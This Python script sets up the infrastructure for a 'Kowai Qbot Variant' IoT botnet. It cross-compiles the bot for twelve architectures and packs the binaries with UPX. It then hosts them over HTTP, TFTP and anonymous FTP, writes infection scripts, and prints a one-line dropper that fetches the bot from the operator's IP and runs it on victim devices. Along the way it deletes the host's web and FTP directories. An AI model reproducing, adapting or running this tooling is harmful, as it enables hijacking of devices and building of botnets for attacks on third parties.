import subprocess, sys, urllib
ip = urllib.urlopen('http://api.ipify.org').read()
exec_bin = "kowai"
botid = "SSH"
print("\033[2J\033[1;1H")
print("\x1b[1;35mKowai Qbot Variant\x1b[0m")
input2 = raw_input("Install Binarys? [y/n]: ")
if input2.lower() == "y":
    get_arch = True
else:
    get_arch = False
print(" ")
bot = "bot.c"
i = 0
num = 0
slump = True
ARCHS = [
	"ARCH_MIPS",
	"ARCH_MIPSEL",
	"ARCH_SH4",
	"ARCH_I5",
	"ARCH_ARM6",
	"ARCH_I6",
	"ARCH_PPC",
	"ARCH_M68k",
	"ARCH_SPARC",
	"ARCH_ARM4",
	"ARCH_ARM5",
	"ARCH_ARM7"
]
CompArchName = ["kowaimips",  #mips  1
"kowaimpsl", #mipsel                 2
"kowaish4", #sh4                     3
"kowaix86", #i585                    4
"kowaiarm6",  #Armv6l                5
"kowaii6",  #i6                      6
"kowaippc",  #ppc                    7
"kowaim68k",  #m68k                  9
"kowaispc",  #sparc                  10
"kowaiarm4",  #Armb4l                11
"kowaiarm5",  #Armv5l                12
"kowaiarm7"]  #Armv7l                13
ccs = ["mips",                   #1
"mipsel",                        #2
"sh4",                           #3
"i586",                          #4
"armv6l",                        #5
"i686",                          #6
"powerpc",                       #7
"m68k",                          #8
"sparc",                         #9
"armv4l",                        #10
"armv5l",                        #11
"armv7l"]                        #12
downloadarch = ['http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2',
'http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i686.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2',
'https://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2',
'https://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2',
'https://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-armv7l.tar.bz2']
 
def run(cmd):
    subprocess.call(cmd, shell=True)
if slump == True:
    run("rm -rf /var/www/html/* /var/lib/tftpboot/* /var/ftp/*")
    run("yum install bzip2 -y &> /dev/null")
    if get_arch == True:
        run("rm -rf cross-compiler-*")
        print("\x1b[1;35mDownloading Architectures\x1b[0m")
        print("")
        for arch in downloadarch:
            print("\x1b[1;35mDownloading " + ccs[i] + "!")
            print(" ")
            run("wget " + arch + " --no-check-certificate -q")
            run("tar -jxf *tar.bz2")
            print("\x1b[1;35mExtracting " + ccs[i] + "!")
            print(" ")
            run("rm -rf *tar.bz2")
            i += 1
        i = 0
        print("Successfully Downloaded and Extracted Architectures")
        print(" ")
        print("Moving Architectures")
        print(" ")
        run("/etc/xcompile")
        run("mkdir /etc/xcompile/")
        run("mv cross-compiler-armv4l /etc/xcompile/armv4l")
        run("mv cross-compiler-armv5l /etc/xcompile/armv5l")
        run("mv cross-compiler-armv6l /etc/xcompile/armv6l")
        run("mv cross-compiler-armv7l /etc/xcompile/armv7l")
        run("mv cross-compiler-i586 /etc/xcompile/i586")
        run("mv cross-compiler-m68k /etc/xcompile/m68k")
        run("mv cross-compiler-mips /etc/xcompile/mips")
        run("mv cross-compiler-mipsel /etc/xcompile/mipsel")
        run("mv cross-compiler-powerpc /etc/xcompile/powerpc")
        run("mv cross-compiler-sh4 /etc/xcompile/sh4")
        run("mv cross-compiler-sparc /etc/xcompile/sparc")
        run("mv cross-compiler-i686 /etc/xcompile/i686")
        print("Finished Moving Architectures To /etc/xcompile/")
        print(" ")
	print("Compiling Architectures")
    print(" ") 
    for cc in ccs:
        print("Cross Compiling for "+cc+"!")
        run('''/etc/xcompile/'''+cc+'''/bin/'''+cc+'''-gcc -D'''+ARCHS[i]+''' -static -w -pthread -o '''+CompArchName[i]+''' '''+bot+''' > /dev/null''')
        i += 1
    i = 0
    print("Moving Compiled Architectures")
    print(" ")
    run("rm -rf /var/www/html /var/ftp /var/lib/tftpboot")
    run("mkdir /var/www/html")
    run("mkdir /var/ftp")
    run("mkdir /var/lib/tftpboot")
    run("cp 8*8 /var/www/html")
    run("cp 8*8 /var/ftp")
    run("mv 8*8 /var/lib/tftpboot/")
    print("Setting up HTTP TFTP and FTP for your payload")
    print(" ")
    run("yum install httpd -y &> /dev/null")
    run("service httpd start ")
    run("yum install xinetd tftp tftp-server -y &> /dev/null")
    run("yum install vsftpd -y &> /dev/null")
    run("service vsftpd start &> /dev/null")
    run('''echo -e "# default: off
    # description: The tftp server serves files using the trivial file transfer \
    #       protocol.  The tftp protocol is often used to boot diskless \
    #       workstations, download configuration files to network-aware printers, \
    #       and to start the installation process for some operating systems.
    service tftp
    {
            socket_type             = dgram
            protocol                = udp
            wait                    = yes
            user                    = root
            server                  = /usr/sbin/in.tftpd
            server_args             = -s -c /var/lib/tftpboot
            disable                 = no
            per_source              = 11
            cps                     = 100 2
            flags                   = IPv4
    }
    " > /etc/xinetd.d/tftp''')	
    run("service xinetd start &> /dev/null")
    run('''echo -e "listen=YES
    local_enable=NO
    anonymous_enable=YES
    write_enable=NO
    anon_root=/var/ftp
    anon_max_rate=2048000
    xferlog_enable=YES
    listen_address='''+ ip +'''
    listen_port=21" > /etc/vsftpd/vsftpd-anon.conf''')
    run("service vsftpd restart &> /dev/null")
    run("service xinetd restart &> /dev/null")
    print("Creating .sh Bins")
    print(" ")
    run('echo "#!/bin/bash" > /var/lib/tftpboot/t8UsA.sh')
    run('echo "ulimit -n 1024" >> /var/lib/tftpboot/t8UsA.sh')
    run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/t8UsA.sh')
    run('echo "#!/bin/bash" > /var/lib/tftpboot/t8UsA2.sh')
    run('echo "ulimit -n 1024" >> /var/lib/tftpboot/t8UsA2.sh')
    run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/t8UsA2.sh')
    run('echo "#!/bin/bash" > /var/www/html/8UsA.sh')
    run('echo "ulimit -n 1024" >> /var/lib/tftpboot/t8UsA2.sh')
    run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/t8UsA2.sh')
    run('echo "#!/bin/bash" > /var/ftp/8UsA.sh')
    run('echo "ulimit -n 1024" >> /var/ftp/t8UsA2.sh')
    run('echo "cp /bin/busybox /tmp/" >> /var/ftp/t8UsA2.sh')
    for i in CompArchName:
        run('echo "cd /tmp; echo ''>DIRTEST || cd /var/run; echo ''>DIRTEST || cd /mnt; echo ''>DIRTEST || cd /root; echo ''>DIRTEST; wget http://' + ip + '/' + i + '; curl -O http://' + ip + '/' + i + ';cat ' + i + ' >'+exec_bin+';chmod +x *;./'+exec_bin+' '+botid+'" >> /var/www/html/8UsA.sh')
        run('echo "cd /tmp; echo ''>DIRTEST || cd /var/run; echo ''>DIRTEST || cd /mnt; echo ''>DIRTEST || cd /root; echo ''>DIRTEST; ftpget -v -u anonymous -p anonymous -P 21 ' + ip + ' ' + i + ' ' + i + ';cat ' + i + ' >'+exec_bin+';chmod +x *;./'+exec_bin+' '+botid+'" >> /var/ftp/8UsA1.sh')
        run('echo "cd /tmp; echo ''>DIRTEST || cd /var/run; echo ''>DIRTEST || cd /mnt; echo ''>DIRTEST || cd /root; echo ''>DIRTEST; tftp ' + ip + ' -c get ' + i + ';cat ' + i + ' >'+exec_bin+';chmod +x *;./'+exec_bin+' '+botid+'" >> /var/lib/tftpboot/t8UsA.sh')
        run('echo "cd /tmp; echo ''>DIRTEST || cd /var/run; echo ''>DIRTEST || cd /mnt; echo ''>DIRTEST || cd /root; echo ''>DIRTEST; tftp -r ' + i + ' -g ' + ip + ';cat ' + i + ' >'+exec_bin+';chmod +x *;./'+exec_bin+' '+botid+'" >> /var/lib/tftpboot/t8UsA2.sh')    
        run("service xinetd restart &> /dev/null")
    run("service httpd restart &> /dev/null")
    run('echo -e "ulimit -n 99999" >> ~/.bashrc')
    print("\x1b[0;32mWGET: cd /tmp; echo ''>DIRTEST || cd /var/run; echo ''>DIRTEST || cd /mnt; echo ''>DIRTEST || cd /root; echo ''>DIRTEST; wget http://" + ip + "/8UsA.sh; curl -O http://" + ip + "/8UsA.sh; chmod 777 8UsA.sh; sh 8UsA.sh; tftp " + ip + " -c get t8UsA.sh; chmod 777 t8UsA.sh; sh t8UsA.sh; tftp -r t8UsA2.sh -g " + ip + "; chmod 777 t8UsA2.sh; sh t8UsA2.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " 8UsA1.sh 8UsA1.sh; sh 8UsA1.sh; rm -rf 8UsA.sh t8UsA.sh t8UsA2.sh 8UsA1.sh; rm -rf *\x1b[0m")
    print("")
    print("\x1b[0;34mUPX Packer downloading")
    run("wget https://github.com/upx/upx/releases/download/v3.94/upx-3.94-i386_linux.tar.xz -q")
    run("tar -xvf *.xz")
    run("mv upx*/upx .")
    print("")
    print("\x1b[0;34mUPX Packing wget binarys")
    run("./upx --ultra-brute -q /var/www/html/*")
    print("")
    print("\x1b[0;34mUPX Packing tftp binarys")
    run("./upx --ultra-brute -q /var/lib/tftpboot/*")
    print("")
    print("Cross Compiler Finished")
raw_input("press any key to exit....\n")
